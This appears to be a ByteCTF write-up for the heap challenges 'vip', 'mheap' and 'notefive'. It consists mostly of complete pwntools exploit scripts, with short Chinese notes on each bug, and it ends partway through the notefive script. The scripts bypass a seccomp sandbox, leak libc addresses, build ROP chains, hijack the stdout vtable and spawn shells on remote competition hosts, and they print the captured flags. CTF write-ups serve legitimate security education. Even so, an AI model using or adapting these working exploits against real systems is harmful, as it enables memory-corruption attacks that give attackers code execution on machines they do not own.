    from pwn import *
    def add(p, idx):
        p.sendlineafter('Your choice: ', str(1))
        p.sendlineafter('Index: ', str(idx))
    def show(p, idx):
        p.sendlineafter('Your choice: ', str(2))
        p.sendlineafter('Index: ', str(idx))
    def delete(p, idx):
        p.sendlineafter('Your choice: ', str(3))
        p.sendlineafter('Index: ', str(idx))
    def edit(p, idx, size, content=''):
        p.sendlineafter('Your choice: ', str(4))
        p.sendlineafter('Index: ', str(idx))
        p.sendlineafter('Size: ', str(size))
        if content == '':
            return
        p.send(content)
    def disable_sandbox(p):
        payload = '\x00' * 0x20
        payload += '\x20\x00\x00\x00\x00\x00\x00\x00'
        payload += '\x15\x00\x01\x00\x01\x01\x00\x00'
        payload += '\x06\x00\x00\x00\x00\x00\xFF\x7F'
        payload += '\x06\x00\x00\x00\x00\x00\x05\x00'
        p.sendlineafter('Your choice: ', str(6))
        p.sendafter('please tell us your name: \n', payload)
    def pwn():
        context.terminal = ['tmux', 'split', '-h']
        DEBUG = False
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        elf = ELF('./vip')
        if DEBUG:
            p = process('./vip')
        else:
            p = remote('112.126.103.14', 9999)
        if DEBUG:
            gdb.attach(p)
        context.log_level = 'debug'
        disable_sandbox(p)
        add(p, 0)
        add(p, 1)
        delete(p, 1)
        payload = 'a' * 0x58 + p64(0x61) + p64(0x404100)
        edit(p, 0, len(payload), payload)
        add(p, 2)
        edit(p, 2, len('./flag\x00'), './flag\x00') #heapaddr
        add(p, 3)
        payload = p64(0x404108) + p64(elf.got['puts'])
        edit(p, 3, len(payload), payload)
        show(p, 1)
        libc.address = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
        payload = p64(libc.symbols['__environ'])
        edit(p, 0, len(payload), payload)
        show(p, 1)
        stack_addr = u64(p.recv(6) + '\x00\x00')
        payload = p64(0x404110)
        edit(p, 0, len(payload), payload)
        show(p, 1)
        heap_addr = u64(p.recvuntil('\nDone', drop=True).ljust(8, '\x00'))
        ret_rop = stack_addr - (0x7ffc05877e58 - 0x7ffc05877d68)
        edit(p, 0, len(payload), p64(ret_rop))
        pop_rdi_ret = 0x00000000004018fb
        pop_rsi_r15_ret = 0x00000000004018f9
        pop_rdx_ret = libc.address + 0x0000000000001b96
        syscall_ret = libc.address + 0x00000000000d2975
        pop_rax_ret = libc.address + 0x00000000000439c8
        leave_ret = 0x0000000000401445
        pop_rbp_ret = 0x00000000004011d9
        rop = p64(pop_rdi_ret) + p64(heap_addr)
        rop += p64(pop_rsi_r15_ret) + p64(0x0) + p64(0)
        rop += p64(pop_rdx_ret) + p64(0)
        rop += p64(pop_rax_ret) + p64(2)
        rop += p64(syscall_ret)
        rop += p64(pop_rdi_ret) + p64(3)
        rop += p64(pop_rsi_r15_ret) + p64(0x00404800) + p64(0)
        rop += p64(pop_rdx_ret) + p64(0x100) 
        rop += p64(elf.plt['read'])
        rop += p64(pop_rdi_ret) + p64(0x00404800)
        rop += p64(elf.plt['puts'])
        rop += p64(0xdeadbeef)
        edit(p, 1, len(rop), rop)
        p.sendlineafter('Your choice: ', str(5))
        print hex(heap_addr)
        print hex(ret_rop)
        print hex(libc.address)
        p.interactive()
        p.close()
        return 1
    #bytectf{2ab64f4ee279e5baf7ab7059b15e6d12}
    if __name__ == '__main__':
        pwn()
    '''
    0x00000000004018f4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004018f6 : pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004018f8 : pop r14 ; pop r15 ; ret
    0x00000000004018fa : pop r15 ; ret
    0x00000000004018f3 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004018f7 : pop rbp ; pop r14 ; pop r15 ; ret
    0x00000000004011d9 : pop rbp ; ret
    0x00000000004018fb : pop rdi ; ret
    0x00000000004018f9 : pop rsi ; pop r15 ; ret
    0x00000000004018f5 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000401016 : ret
    0x0000000000401401 : ret 0x2be
    0x0000000000401072 : ret 0x2f
    0x00000000004012a2 : ret 0xc604
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
     0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009
     0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
     0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009
     0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
     0008: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x06 0x00 0x00 0x00000000  return KILL
    '''
### mheap
read函数返回值检查的bug，导致向前溢出。
    from pwn import *
    def add(p, idx, size, content):
        p.sendlineafter('Your choice: ', str(1))
        p.sendlineafter('Index: ', str(idx))
        p.sendlineafter('size: ', str(size))
        if size == len(content):
            p.sendafter('Content: ', content)
        else:
            p.sendlineafter('Content: ', content)
    def show(p, idx):
        p.sendlineafter('Your choice: ', str(2))
        p.sendlineafter('Index: ', str(idx))
    def delete(p, idx):
        p.sendlineafter('Your choice: ', str(3))
        p.sendlineafter('Index: ', str(idx))
    def edit(p, idx, content):
        p.sendlineafter('Your choice: ', str(4))
        p.sendlineafter('Index: ', str(idx))
        p.send(content)
    def pwn():
        context.log_level = 'debug'
        context.terminal = ['tmux', 'split', '-h']
        DEBUG = False
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        elf = ELF('./mheap')
        if DEBUG:
            p = process('./mheap')
        else:
            p = remote('112.126.98.5', 9999)
        if DEBUG:
            gdb.attach(p)
        add(p, 0, 0x1000 - 0x40 - 0x20, 'sunichi') #1
        add(p, 1, 0x10, 'sunichi') #2
        add(p, 2, 0x10, 'sunichi!' * 2) #3
        delete(p, 1) #4
        delete(p, 2) #5 
        p.sendlineafter('Your choice: ', str(1)) #6
        p.sendlineafter('Index: ', str(15))
        p.sendlineafter('size: ', str(0x60))
        payload = p64(0x20) + p64(0x4040cb) + p64(0) * 2 + p64(0x70) + p64(0)[:7] + '\n'
        p.sendafter('Content: ', payload)
        add(p, 1, 0x10, '/bin/sh\x00') #7
        payload = 'a' * 5 + p64(elf.got['puts'])
        add(p, 14, 0x10, payload) #8
        show(p, 0)
        libc.address = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
        p.sendlineafter('Your choice: ', str(4))
        p.sendlineafter('Index: ', str(0))
        p.send(p64(libc.address + 0x4f322))
        p.sendline('sunichi')
        p.sendline('cat flag')
        print hex(libc.address)
        p.interactive()
        p.close()
        #bytectf{34f7e6dd6acf03192d82f0337c8c54ba}
    if __name__ == '__main__':
        pwn()
### notefive
程序没有输出，存在off-by-one漏洞，限制了分配的chunk的大小，导致不能采用0x7f作为fastbin的size。利用off-by-one造成堆块重叠，`unsorted bin
attack`修改`global_max_fast`。之后几乎所有的chunk都属于fastbin的范围内，利用stderror结构体flag字段的0xfb作为chunk的size，可在stdout附近布置好合适的size，再次fastbin
attack可以完全控制stdout，泄露libc地址以及修改vtable来getshell
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    def add(p,idx,size):
        sla(p,'choice>> ',str(1))
        sla(p,'idx: ',str(idx))
        sla(p,'size: ',str(size))
    def edit(p,idx,content):
        sla(p,'choice>> ',str(2))
        sla(p,'idx: ',str(idx))
        sa(p,'content: ',content)
    def delete(p,idx):
        sla(p,'choice>> ',str(3))
        sla(p,'idx: ',str(idx))
    DEBUG = 0
    ATTACH = 0
    context.arch = 'amd64'
    BIN_PATH = './note_five'
    elf = ELF(BIN_PATH)
    context.terminal = ['tmux', 'split', '-h']
    def pwn():
        if DEBUG == 1:
            p = process(BIN_PATH)
            context.log_level = 'debug'
            if context.arch == 'amd64':
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        else:
            p = remote('112.126.103.195', 9999)
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            context.log_level = 'debug'
        # 0x555555554000
        # global_max_fast 0x7ffff7dd37f8
        # unsortedbin     0x7ffff7dd1b78
        # stdout          0x7ffff7dd2620
        # addr            0x7ffff7dd37e8
        # free_hook       0x7ffff7dd37a8
        # malloc_hook     0x7ffff7dd1b10
        # IO_list_all     0x7ffff7dd2520
        add(p,0,0xf8)
        add(p,1,0xf8)
        add(p,2,0xf8)
        add(p,3,0xf8)
        add(p,4,0xf8)
        # overlap
        delete(p,0)
        data = '\x00'*0xf0+p64(0x300)+'\x00'
        edit(p,2,data)
        delete(p,3)
        add(p,0,0xe0) #0
        add(p,0,0x100)#0 overlap 1
        payload = p64(0)+'\xe8\x37\n'
        edit(p,2,payload)
        add(p,3,0x1f0) #3=2
        data = p64(0)+p64(0xf1)+'\x00'*0xe0+p64(0)+p64(0x21)+'\n'
        edit(p,0,data)
        delete(p,1)
        data = p64(0)+p64(0xf1)+'\x3b\x25\n'
        edit(p,0,data)
        add(p,1,0xe8)
        add(p,4,0xe8)
        payload = '\x00'*(0xe0-11-8)+p64(0x101)+p64(0xfbad1800)+'\n'
        edit(p,4,payload)
        edit(p,0,p64(0)+p64(0x101)+'\n')
        delete(p,1)
        data = p64(0)+p64(0x101)+'\x10\x26\n'
        edit(p,0,data)
        add(p,1,0xf8)
        add(p,4,0xf8)
        payload = p64(0xfbad1800)+p64(0)*3+'\x00\n'
        edit(p,4,payload)
        ru(p,'\x00\x18\xad\xfb')
        rn(p,28)
        libc_addr = u64(rn(p,8))
        log.info('libc addr: '+hex(libc_addr))
        libc_base = libc_addr-(0x7ffff7dd2600-0x7ffff7a0d000)
        log.info('libc base: '+hex(libc_base))
        libc.address = libc_base
        stdout = libc_base+(0x00007ffff7dd2620-0x7ffff7a0d000)
        one_gadget = 0xf1147